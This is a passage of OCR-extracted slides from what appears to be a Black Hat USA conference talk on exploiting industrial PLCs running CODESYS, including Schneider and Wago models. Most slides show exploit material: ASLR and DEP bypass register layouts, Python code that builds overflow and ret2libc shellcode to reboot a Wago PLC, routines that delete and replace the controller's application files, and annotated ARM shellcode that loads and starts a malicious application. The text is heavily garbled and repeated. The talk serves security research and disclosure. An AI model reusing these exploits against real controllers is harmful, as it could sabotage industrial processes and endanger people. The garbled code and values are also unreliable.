> Recovered by OCR — confidence 80/100 on the text kept, 55/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
USA &
[03296e30]:
Exploit
# START CRASH #
plcMdl ="TM251MESE”
osDate eb 2 2022 13:46:29"
tskName ="B1kDrvShmM2XX"
crDate 7/81/2800"
crTime 2:26:33"
=0x00000000
=0x16000100
=0x17000100
=0x1a000100
=0x1b000100
=0x00000000
mmuAdr
stack
37000100
80000118
86000100
12000100
16000100
80829414) 90000100
83000100 84900100
13000100 140900100
17000100 18000100
30000108 31000100
34000100 35000100
38000108 39000100
49000108 41000100
@5000100
11000100
15000100
19800100
22000100
22000100
32000100
36000100
3a000100
42000100
Events
```

## Slide 118

### Exploit

### CODESYS Disable DEP By Design (RCE)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 55/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
USA &
[03296e30]:
Exploit
# START CRASH #
plcMdl ="TM251MESE”
osDate eb 2 2022 13:46:29"
tskName ="B1kDrvShmM2XX"
crDate 7/81/2800"
crTime 2:26:33"
=0x00000000
=0x16000100
=0x17000100
=0x1a000100
=0x1b000100
=0x00000000
mmuAdr
stack
37000100
80000118
86000100
12000100
16000100
80829414) 90000100
83000100 84900100
13000100 140900100
17000100 18000100
30000108 31000100
34000100 35000100
38000108 39000100
49000108 41000100
@5000100
11000100
15000100
19800100
22000100
22000100
32000100
36000100
3a000100
42000100
Events
```

## Slide 119

### Exploit

### CODESYS Disable DEP By Design (RCE)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 55/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
USA &
[03296e30]:
Exploit
# START CRASH #
plcMdl ="TM251MESE”
osDate eb 2 2022 13:46:29"
tskName ="B1kDrvShmM2XX"
crDate 7/81/2800"
crTime 2:26:33"
=0x00000000
=0x16000100
=0x17000100
=0x1a000100
=0x1b000100
=0x00000000
mmuAdr
stack
37000100
80000118
86000100
12000100
16000100
80829414) 90000100
83000100 84900100
13000100 140900100
17000100 18000100
30000108 31000100
34000100 35000100
38000108 39000100
49000108 41000100
@5000100
11000100
15000100
19800100
22000100
22000100
32000100
36000100
3a000100
42000100
Events
```

## Slide 120

### Exploit

### CODESYS Disable DEP By Design (RCE)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 61/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
USA &
Exploit
# START CRASH #
plcMd1 M251MESE™
osDate eb 2 2022 13:46:29"
sysErr
tskName ="B1kDrvShmM2XX"
crDate =
crTime =
re =
r3 =0x00000000
r4 =0x16000100
rs =0x17000100
r7 =0x19000100
r8 =0x1a000100
ro =0x1b000100
=0x00000000
mmuAdr
stack
[03296e30]:
[
[
[
80000118
82000100
86000100
0a00016
12000100
16000100
37000100
87000100
Events
```

## Slide 121

Exploit

### Bypass ASLR (AKA You Shall Pass) Wago

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 82/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit USA ©COe
Bypass ASLR (AKA You Shall Pass) Wago
. 00086D4C sub_86CF8 34FF 2FEL x ; Branch with Link and Exchange (register indirect)
.text:00087314 sub_8713C 35 FF 2FE1 4 q ; Branch with Link and Exchange (register indirect)
t 0008762C sub_8747C 35 FF 2FE1 K ; Branch with Link and Exchange (register indirect)
.text:0008A 100 CheckForInterest 35 FF 2FE1 ; Branch with Link and Exchange (register indirect)
tb 0008A12C CheckForInterest 33 FF 2F E1 X 3; Branch with Link and Exchange (register indirect)
.text:0008A 160 CheckForInterest 33 FF 2FE1 4 3; Branch with Link and Exchange (register indirect)
0008A 194 CheckForInterest 33 FF 2FE1 4 3; Branch with Link and Exchange (register indirect)
70008A294 CheckForInterest 33 FF 2FE1 aLX 3 ; Branch with Link and Exchange (register indirect)
00084288 CheckForInterest 33 FF 2F E1 K 3. ; Branch with Link and Exchange (register indirect)
CheckForInterest 33 FF 2FE1 ) 3. ; Branch with Link and Exchange (register indirect)
WebServerHandleRequest 39 FF 2FE1 xX ; Branch with Link and Exchange (register indirect)
SocketSetBlockingMode 33 FF 2FE1 4 3; Branch with Link and Exchange (register indirect)
Fressocet 33 FF 2FE1 23; Branch with Link and Exchange (register indirect)
35 FF 2FE1 5 ; Branch with Link and Exchange (register indirect)
33 FF 2F E1 R3 — ; Branch with Link and Exchange (register indirect)
33 FF 2F E1 xX R3_—_ ; Branch with Link and Exchange (register indirect)
CloseSocketConnection 33 FF 2FE1 4 R3_—_ ; Branch with Link and Exchange (register indirect)
AcceptSocket 33 FF 2FE1 x R3 ‘anch with Link and Exchange (register indirect)
3A FF 2F E1 4 R10 Branch with Link and Exchange (register indirect)
ceptSocket 33 FF 2FE1 4 3 ‘anch with Link and Exchange (register indirect)
AcceptSocket 3A FF 2F E1 xX 0 Branch with Link and Exchange (register indirect)
AcceptSocket 36 FF 2FE1 xX 6 — ; Branch with Link and Exchange (register indirect)
AcceptSocket 36 FF 2FE1 4 6 — ; Branch with Link and Exchange (register indirect)
AcceptSocket 33 FF 2FE1 4 3 Branch with Link and Exchange (register indirect)
AcceptSocket 33 FF 2FE1 4 3 vith Link and Exchange (register indirect)
OpenSocketConnection 33 FF 2FE1 3 vith Link and Exchange (register indirect)
OpenSocketConnection 33 FF 2FE1 ) 3. ; Branch with Link and Exchange (register indirect)
OpenSocketConnection 39 FF 2FE1 xX ; Branch with Link and Exchange (register indirect)
OpenSocketConnection 33 FF 2FE1 x 3 Bra with Link and Exchange (register indirect)
OpenSocketConnection 35 FF 2FE1 K R vith Link and Exchange (register indirect)
OpenSocketConnection 33 4 3 i DI N <q S #BHUSA @BlackHatEvents
```

## Slide 122

Exploit

### Bypass ASLR (AKA You Shall Pass) Wago

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 80/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USAc&
Bypass ASLR (AKA You Shall Pass) Wage
08, #8
SUB
SUB
```

## Slide 123

Exploit

### Bypass ASLR (AKA You Shall Pass) Wago

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 74/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit USAc&
Bypass ASLR RIAKA You Shall Pass) Wago
F2 SUB SP, Rll, #
Ag 9D EB LOMFD SP, {R4-R6,R11,5P,PC}
```

## Slide 124

Exploit

Bypass ASLR (AKA You Shall Pass) Wago

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 75/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit Bypass ASLR (AKA You Shall Pass) Wago

Thread 32 hit Breakpoint 1, 0x00230638 in ?? ()
(gdb) info r
r0              0x0                 0
r1              0xb2fc1e38          3002867256
r2              0xb2fc1e3c          3002867260
r3              0x6c                108
r4              0xb2fc1e38          3002867256
r5              0xb2fc1be8          3002866664
r6              0xb2fc1be6          3002866662
r7              0x6eb0              28336
r8              0x4b1820            4921376
r9              0xb2fc1e68          3002867304
r10             0x17620             95776
r11             0xb2fc1e14          3002867220
r12             0xb2fc1be0          3002866656
sp              0xb2fc1dfc          0xb2fc1dfc
lr              0x230630            2295344
pc              0x230638            0x230638
cpsr            0x20010010          536936464
fpscr           0x10                16
(gdb)
```

## Slide 125

Exploit

Bypass ASLR (AKA You Shall Pass) Wago

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 76/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit Bypass ASLR (AKA You Shall Pass) Wago

Thread 32 hit Breakpoint 1, 0x00230638 in ?? ()
(gdb) info r
r0              0x0                 0
r1              0xb2fc1e38          3002867256
r2              0xb2fc1e3c          3002867260
r3              0x6c                108
r4              0xb2fc1e38          3002867256
r5              0xb2fc1be8          3002866664
r6              0xb2fc1be6          3002866662
r7              0x6eb0              28336
r8              0x4b1820            4921376
r9              0xb2fc1e68          3002867304
r10             0x17620             95776
r11             0xb2fc1e14          3002867220
r12             0xb2fc1be0          3002866656
sp              0xb2fc1dfc          0xb2fc1dfc
lr              0x230630            2295344
pc              0x230638            0x230638
cpsr            0x20010010          536936464
fpscr           0x10                16
(gdb)

[orange highlight box drawn around the r1 and r2 rows]
```

## Slide 126

Exploit

Bypass ASLR (AKA You Shall Pass) Wago

#BHUSA  @BlackHatEvents


> Read by a vision model from the page image (replacing unreliable OCR) — confidence 75/100 on the text kept, 67/100 across the whole page. Wording is approximate. **This block contains dense hex, addresses or tabular data: individual values are frequently misread and its row/column structure is not preserved. Do not quote exact values from it — check the source PDF.**

```text
Exploit Bypass ASLR (AKA You Shall Pass) Wago

Thread 32 hit Breakpoint 1, 0x00230638 in ?? ()
(gdb) info r
r0              0x0                 0
r1              0xb2fc1e38          3002867256
r2              0xb2fc1e3c          3002867260
r3              0x6c                108
r4              0xb2fc1e38          3002867256
r5              0xb2fc1be8          3002866664
r6              0xb2fc1be6          3002866662
r7              0x6eb0              28336
r8              0x4b1820            4921376
r9              0xb2fc1e68          3002867304
r10             0x17620             95776
r11             0xb2fc1e14          3002867220
r12             0xb2fc1be0          3002866656
sp              0xb2fc1dfc          0xb2fc1dfc
lr              0x230630            2295344
pc              0x230638            0x230638
cpsr            0x20010010          536936464
fpscr           0x10                16
(gdb)

[orange highlight boxes drawn around the r1/r2 rows and around the sp row]
```

## Slide 127

Exploit

Bypass ASLR For Real  (AKA You Shall Pass)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 81/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
pifek hat ,
expLoit_bytes = REGISTERS_OVERFLOW_ASLR_AND_DEP + BLX_R2_ADDRESS + REBOOT_WAGO_PLC_RET2LIBC_SHELLCODE
tag_thirteen = AppLayer.add_tag(TAG_TRACE_PACKET_CREATE_13, exploit_bytes, AL_ALIGN40)
```

## Slide 128

### Exploit

Bypass ASLR For Real  (AKA You Shall Pass)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 57/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black hat |
Exploit USA 2&0:
REGISTERS_OVERFLOW_ASLR_AND_DEP = bytearray([@x72, 9x65, 8x62, Oxéf, # reboot
Ox3C, 98xBC, OxFF, OxB2, # R4 value address on the stack of the string
0x78, 0x59, 0x08, Ox08, #RS5 value address of rts_system
0x73, 9x06, 98x08, 8x08, # R11 value
Ox00, OxEO, OxSF, 8x08, # SP value third segment of codesys Loaded
OxAC, 98x66, OxOC, 8x80, # PC value BLX R2
```

## Slide 129

Exploit

Bypass ASLR For Real  (AKA You Shall Pass)

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 84/100 on the text kept, 77/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Bypass ASLR For Real (AKA You 1 Shall Pass)
black hat |
Exploit USA 2&0:
expLoit_bytes = REGISTERS_OVERFLOW_ASLR_AND_DEP + BLX_R2_ADDRESS + REBOOT_WAGO_PLC_RET2LIBC_SHELLCODE
tag_thirteen = AppLayer.add_tag(TAG_TRACE_PACKET_CREATE_13, exploit_bytes, AL_ALIGN4®O)
send_big_data(dsta=tag_thirteen, =OxOF, =6x82, =dev)
REBOOT_WAGO_PLC_RET2LIBC_SHELLCODE = bytearray([69x00, 0x00, 0x00, OxEA, # B pc+8
*
OxFF, OxDO, Ox4C, OxE2, # SUB SP, R12, #0xFF SP contains now valid location
OxFE, 0x00, 0x41, OxE2, # SUB RO, R1, 32
OxFE, 0x00, 0x40, OxE2, # SUB RO, RO, 32 RO now contains R1-0x1FC (points to string on stack)
0x35, OxFF, Ox2F, OxE1, # BLX R5 jump to r5 which is the command to execute rts_system
OxFF, OxFF, OxFF, OxFF,
```

## Slide 130

Bypass ASLR For Real  (AKA You Shall Pass)

Exploit

Stack

SP 0x21C <u>R4          0xB2FFBC3C R5          0x00085978 R6          0x00000072 R11        0x00000073 SP           0x003FE000</u> R11 <u>PC          0x000C66AC</u> R1 ~~2~~ <u>0x000000EA</u> B PC+8 <u>0x00000000</u> 0xFFD04CE2 SUB SP,R12,FF <u>0xFE0041E2</u> SUB R0,R1,32 <u>0xFE0040E2</u> SUB R0,R0,32 BLX R5 <u>0x35FF2FE1</u>

#BHUSA  @BlackHatEvents

## Slide 131

### Bypass ASLR For Real  (AKA You Shall Pass)

Exploit

Stack

SP
REGISTERS_OVERFLOW_ASLR_AND_DEP
0x21C
R4          0xB2FFBC3C
R5          0x00085978
R6          0x00000072
R11        0x00000073
SP           0x003FE000
R11
PC          0x000C66AC
R1 2 0x000000EA B   PC+8
0x00000000
0xFFD04CE2 SUB  SP,R12,FF
0xFE0041E2 SUB  R0,R1,32
0xFE0040E2 SUB  R0,R0,32
BLX  R5
0x35FF2FE1

#BHUSA  @BlackHatEvents

## Slide 132

Bypass ASLR For Real  (AKA You Shall Pass)

Exploit

Stack
SP
REGISTERS_OVERFLOW_ASLR_AND_DEP
0x21C
R4          0xB2FFBC3C
R5          0x00085978
R6          0x00000072
R11        0x00000073
SP           0x003FE000
R11
BLX_R2_ADDRESS PC          0x000C66AC
R1 2 0x000000EA B   PC+8
0x00000000
0xFFD04CE2 SUB  SP,R12,FF
0xFE0041E2 SUB  R0,R1,32
0xFE0040E2 SUB  R0,R0,32
BLX  R5
0x35FF2FE1

#BHUSA  @BlackHatEvents

## Slide 133

Bypass ASLR For Real  (AKA You Shall Pass)

Exploit

Stack
SP
REGISTERS_OVERFLOW_ASLR_AND_DEP
0x21C
R4          0xB2FFBC3C
R5          0x00085978
R6          0x00000072
R11        0x00000073
SP           0x003FE000
R11
BLX_R2_ADDRESS PC          0x000C66AC
R1 2 0x000000EA B   PC+8
REBOOT_WAGO_PLC_RET2LIBC_SHELLCODE 0x00000000
0xFFD04CE2 SUB  SP,R12,FF
0xFE0041E2 SUB  R0,R1,32
0xFE0040E2 SUB  R0,R0,32
BLX  R5
0x35FF2FE1

#BHUSA  @BlackHatEvents

## Slide 134

Exploit

### The Physical Setup

#BHUSA  @BlackHatEvents

## Slide 135

Exploit

Malicious Payload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 76/100 on the text kept, 76/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
black hat |
Malicious Payload
Exploit Ja”
```

## Slide 136

### Exploit

Malicious Payload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 78/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Malicious Payload
Exploit USA 2&0:
2,414 Linker Add
CRC File
APP File
delete_remote_file(device, "App/Application.app")
delete_remote_file(device, "App/Application.map")
upload_malicious_map_file(device)
upLoad_malicious_application_file(device)
```

## Slide 137

### Exploit

### Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 82/100 on the text kept, 72/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploit LUISA 2@ve
delete_remote_file(device, "App/Application.app")
dplete_remote_file(device, "App/Application.crc™)
lupLoad_malicious_map_file(device)
upLoad_malicious_application_file(device)
def delete_remote_file(dev, filename):
gl, 11, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST,
68, # file manager
OxBe, # remove file
=DEFAULT_NETHASK)
AppLayer.add_tag(0x1, filename, AL_ALIGN4®, al)
pkt = dev.dev_channel.complete_packet(gl, 11, al)
resp = dev.dev_channel.send(pkt, 5)
if resp is None:
else:
```

## Slide 138

### Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 70/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ATION + jump_address BLACKHAT
13 exploit_bytes, AL_ALIGN46)
blackhat ~~
2 fhome/a/PycharmProjects/PLCCra /Application
EB Application.map 2,414 ngle_chunk_size 5
Application.cre
Application.app
number_of_ chunks send = file / single
ast_chunk_size = file_total_si chunk_size
delete_remote_file(device App/AppLication. app") "T>] 1L4 6 to send is file.". format =file tot ize
upLoad_malicious_map_file(device) data = file_to_send.read(single_chunk_size
upload_malicious_crc_file(device)
i [ D1L4; Sent {part}'th part of the pay format =i+1
gl, 11, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST tT("l>j] GINDIL4 ast chunk
=DEFAULT_NETMASK
pLayer.add_tag( filename, AL_
ct dev_channel.complete_packet(gl, 11, al) endto(last da udp_it
dev.dev_channel.send(pkt, 5)
i>] GINDIL4 Payloe l
int("[>] G1ND1L4: Successfully deleted {name} format ( =filename)
```

## Slide 139

### Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
eos .. d_big_data =ALCMD =ALSUBCMD_TRACE_MANAGER_PACKET =de
\ udp_port =
| sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
path, “rb")
lication.map
lication.cre
Application.app
deLete_remote_file(device Ap
p/AppLication. app") "[>] Going to send isize}B8 file.".format( =file_total_size))
. ij (number_of_chunks_to_send)
lupLoad_malicious_map_file(device) data = file_to_send.read(single_chunk_size
upLoad_malicious_appLication_file(device)
4
int(*[>] GIND1L4: Sent {part}'th part of the payload.".format( =i+1
gl, U1, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST int("(>] GINDIL4: Sending Last chunk.")
=DEFAULT_NETMASK) sleep
AppLayer.add_tag(0x01, filename, AL_ALIGN48, al) gata fi .Pead(Last_chunk_size
pkt = dev.dev_channel.complete_packet(gl, 11, al) .sendto(last_data, fudp_ip, udp_port))
resp = dev.dev_channel.send(pkt, 5)
resp i €
int(*[>] G1ND1L4: Failed deleting {name}.".format( ilenane)) "[>] GINDIL4: Full Payload Uploaded.")
int("[>] G1ND1L4: Successfully deleted {name}. '.format(namc=filename))
```

## Slide 140

### Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 78/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
exploit_bytes = BLACKHAT_REGISTERS_OVERFLOW_APPLICATION + jump_address2 + BLACKHAT_SHELLCODE_APPLICATION i
tag_13 = AppLayer.add_tag(TAG_TRACE_PACKET_CREATE_13, exploit_bytes, AL_ALIGN48)
send_big_data( =tag_13 =ALCMD_TRACE_MANAGER =ALSUBCMD_TRACE_MANAGER_PACKET_CREATE
vdp_ip = “10.16.222.235"
fe) rele sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
path = r"“/home/a/PycharaProjects/PLCCrasher/Application.app py
to_send = | (path, “rb")
Exploit USF
B Application.map
_total_size = os.stat(path).
plication.cre
Application.app
number_of_chunks_to
gle_chunk_size
Last_chunk_s = file_total_size
singLe_chunk_size
delete_remote_file(device, "App/Application.app") ("{>] GINDIL4 Going to send isize}8 file.".format( =file_total_size))
dplete_remote_file(device App/AppLication.crc™)
‘Lete_remote_file(device App/Application.map") ¢
lupLoad_malLicious_map_file(device) data = file_to_send.read(single_chunk_size
i {part}'th part of the payload.”.format( =i+1
gl, 11, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST int("[>] GINDIL4: Sending Last chunk.")
=DEFAULT_NETMASK)
v.dev_channel.complete_packet(gl, 11, al) sock.sendto(last_data, (udp_ip, udp_port))
```

## Slide 141

### Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 69/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
LACKHAT_SHELLCODE_APPL
bytes, AL_ALIGN4B)
exploit_t + jump_addre
ICATION
tag_i3 AppLayer .a
exploit
_MANAGER =
send_big_data(
SUBCMD_TRACE_MANAGER_PACKET_CREATE =de\
vdp_port =
sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
= p*/home/a/PycharaProjects/PLCCrasher/AppL
(path ro")
o5.stat(path) .st_size
lication.map
lication.app 3,332,704 APP File
number_of_chunks_t = file_ single_chunk_
| \ Last_chunk = file_tota singLe_chunk_size
delete_remote_file(device, "App/Application.app "[>] 114: Going to send isize}8 file.".format( =file_total_size))
ii (number_of_chunks_to_send)
€ i L Sent tpart}'th part of the payload.*.ft at( =i+i1
gl, U1, al = dev.dev_channel.create_packet (DATA_SEND_REQUEST int("(>] GINDIL4: Sending Last chunk.")
=DEFAULT_NETHASK) sleep(
fata = fil d.readflast ,
AppLayer.add_tag(0x@1, filename, AL_ALIGN4®, al) data fi id. read(Last_chunk
pkt = dev.dev_channel.complete_packet(gl, 11, al) sock.sendto(last_data, (udp_ip, udp_port))
resp = dev.dev_channel.send(pkt, 5)
if resp is h
int("[>] G1ND1L4: Failed deleting {name}. '.format( ilenane)) t("[>] GINDIL4: Full Payload Uploaded.")
```

## Slide 142

### Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 66/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
ERS_OVERFLOW_AP
BLACKHAT_SHE
AC _CREA _bytes, AL_ALIGN4B)
=ALCMD_TRACE_MANAGER =
lication.map
lication.cre
Application.app
single_chunk
ast_chunk_size singLe_chunk_size
p
dplete_remote_file(device, “App/
p
. i number_of_chunks_to_send)
i ] GINDIL4: Sent {part}'th part of t format =i +1
f delete_remote_file(dev, filename)
[ L4 ending Last chunk.")
gl, 11, al = dev.dev_channel.create_packet (DATA_SEND_REQUESY int("[>] G1
readt t nunk
AppLayer.add_tag( filename, AL_ALIGN48, al) .read(Last_chunk_ )
pkt = dev.dev_channel.complete_packet(gl, 11, al) {udp_ip, udp_port))
resp = dev.dev_channel.send(pkt, 5)
f resp i
int("[>] G1ND1L4: Failed deleting {name}. *. format (name=filenane)) t("{>] GIND1 Full Payload Uploaded."
```

## Slide 143

### Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 77/100 on the text kept, 68/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
RACE_MANAGER ALSUBCMD_TRACE_MANAGER_PACKET_CREATE =de
Exploit USA ©COe
B Application.map
Application.cre
Application.app
/ single_chunk
chunk_size
delete_remote_file(device, "App/Application.app") "[>] 1L4: Going to send isize}8 file.". format =file_total_size
eLete_remote_file(device App/AppLication.map") |
upLoad_malicious_map_file(device) f
upLoad_malicious_crc_file(device) |
{part}'th part of
delete_remote_file(dev, filename)
chunk.")
gl, Ul, al = dev.dev_channel.create_packet (DATA_SENDk t("[>] G1
pkt = dev.dev_channel.complete_packet(gl, 11, al) +
dev.dev_channel.send(pkt, 5)
resp i |
t("[>] GIND1L4: Failed deleting {name}.".format( Use) t("[>] GINDIL4: Full Payload Uploaded.’
```

## Slide 144

### Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 75/100 on the text kept, 65/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
JBCMD_TRACE_MANAG
Exploit USA ©COe
st_size
EB) Application.map e 3
Application.cre
Application.app 3,
number_of_chunk to_se
ast_chunk = file
delete_remote_file(device, "App/Application. app") "[>] GINDIL4: Going to send isize}8 file.". format =file total size
upLoad_malicious_map_file(device) data = file_to_send e chunk siz
upLoad_malicious_application_file(device)
delete_remote_file(dev
gl, Ll, al = dev.dev_chann te_packet (DATA_SEND_REQUEST a { o ast chunk.")
=DEFAULL a sleep
AppLayer.add_tag( filename, AL_ALIGN48, al read(last_c a)
pkt = dev.dev_channel.complete_packet(gl, 11, al) i udp_ip, udp
t(*(>] GIND1L4: Failed deleting {name}.*.forn , wf GIND Full Pa ad Untonded
| C 4 Payloa ploade
int("[>] G1ND1L4: Successfully deleted {name}.
```

## Slide 145

### Exploit

### Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 88/100 on the text kept, 84/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
Exploi
Malicious Payload Upload
BLackHat REGISTERS_OVERFLOW_APPLICATION = bytear
@BlackHatEvents
#BHUSA
```

## Slide 146

### Exploit

### Malicious Payload Upload

#BHUSA  @BlackHatEvents

## Slide 147

### Exploit

### Malicious Payload Upload

#BHUSA  @BlackHatEvents

## Slide 148

Exploit

Malicious Payload Upload

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 83/100 on the text kept, 67/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
6x87,
0x08,
6x62,
6x89,
8x31,
6x60,
6x65,
OxFF,
6x68,
6x66,
6x68,
6x09,
0x39,
6x24,
6x66,
8x73,
6x57,
6x68,
0x26,
6x56,
8x66,
8x16,
6x26,
8x62,
8x06,
6x18,
6x36,
8x26,
0x46,
0x66,
OxFF,
6x66,
0x42,
0x27,
6x16,
0x19,
8x61,
8xAG,
0x87,
OxFF,
8x87,
8x87,
8x98,
@xE1,
OxE3,
OxEB,
OxEB,
OxEB,
OxEB,
8x49,
OxF
mov r2, 77
bl SysSockCreateUdp
mov r5, re
mov ro,
mov ri,
mov ro, rid
mov ri, 2
mov r2, r9
bl SysFileOpen
mov ré, re
mov rg, rs
mov ri, r8&
mov r2, Ox3fc
mov r3, r9
bl SysSockRecvFromUdp
mov r2, re
mov rO, ré
mov ri, rs
mov r3, r9
bl SysFileWrite
sub r4, r4&, 1
nop
cmp r4, #8
mov rr, ré
bl SysFileFlush
mov rO, ré
bl SysFileClose
bl AppGetFirstApp
bl AppstartApplication
bl SysTaskGetCurrent
mov ri, @
bl SysTaskEnd
SendPort
RecvPort
store the handle for socket created
Filename
Write Mode
pResult
file
r8 points to recv socket
store the handle for
pbyData
pReply
contains the amount of data received from the socket
r6 points to opened file handle
pbyData
pResult
dec counter
Gx@68, OxDG, 8x40, GxE2, sub sp, sp, #0
if so jump to another iteration
for flushing the data into file
for closing file handle
App descriptor in r8 which means that we can directly call start
start that application
end task status ok
finish all
#BHUSA
@BlackHatEvents
```

## Slide 149

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
Gx8A, OxO6, OxAG, GxE1, # mov rd, rid Filename
@x62, 8x16, OxAG, GxE3, # mov ri, 2 Write Mode
6x31, 0x62, 8xB7, BxEB, # bl SysFileOpen
6x00, 0x60, OxAO, OxE1, # mov ré, rO store the handle for file
6x05, 8x06, 8xAG, BxE1, # mov rd, rs r8 points to recv socket
60x88, 0x18, OxAG, BxE1, # mov ri, r8& pbyData
OxFF, Ox2F, OxAO, OxES, # mov r2, Ox3fec diDataSize
@x69, 6x36, OxAG, GxE1, # mov r3, r9 pReply
Ox9D, OxA1, OxBA, OxEB, # bl SysSockRecvFromUdp
@x68, 8x26, O8xAO, GxE1, # mov r2, re contains the amount of data received from the socket
6x66, 8x80, OxAG, GxE1, # mov ro, ré r6 points to opened file handle
@x68, 8x16, OxAO, GxE1, # mov rl, rs pbyData
60x09, 0x36, O8xAO, OxE1, # mov r3, r? pResult
6x39, OxOA, O0xB7, BxEB, # bl SysFileWrite
@xO1, Ox46, 8x44, BxE2, # sub r4, r4, 1 dec counter
OxE1, 8xAG, 8x00, 8x80, # nop Gx@8, OxDG, 8x40, GxE2, sub sp, sp, #0
6x86, OxGG, 8x54, OxES, # cmp r4, #B check if more data should be recived from net
Q@xF1, OxFF, OxFF, @x1A, # BNE PC - 48 if so jump to another iteration
@x06, 8xGG, OxAG, OxE1, # mov rO, ré for flushing the data into file
6x66, 8x80, OxAG, OxE1, # mov rO, ré for closing file handle
@x73, Ox@2, OxB7, GxEB, # bl SysFileClose
0x73, 0x42, 8xB6, BxEB, # bl AppGetFirstApp App descriptor in r8 which means that we can directly call start
Ox5C, 0x27, OxBé, OxEB, # bl AppstartApplication start that application
6x57, Ox1A, 8xB7, BxEB, # bl SysTaskGetCurrent
6x88, Oxi@, OxAO, OxE3, # mov ri, @ end task status ok
Ox1F, 0x19, O8xB7, OxEB, # bl SysTaskEnd finish all
```

## Slide 150

Malicious Payload Upload

Exploit

#BHUSA  @BlackHatEvents


> Recovered by OCR — confidence 72/100 on the text kept, 71/100 across the whole page. Wording is approximate. Verify exact values against the source PDF.

```text
BLACKHAT_SHELLCODE_APPLICATION = bytearray([@xOF, Ox@G, 8xAG, BxE3, # mov rd, OxF SendPort
OxOF, Oxi@, OxAG, OxE3, # mov ri, GxF RecvPort
@x54, 6xA1, OxBA, @xEB, # bl SysSockCreateUdp
0x08, 0x56, OxAO, OxE1, # mov r5, r6 store the handle for socket created
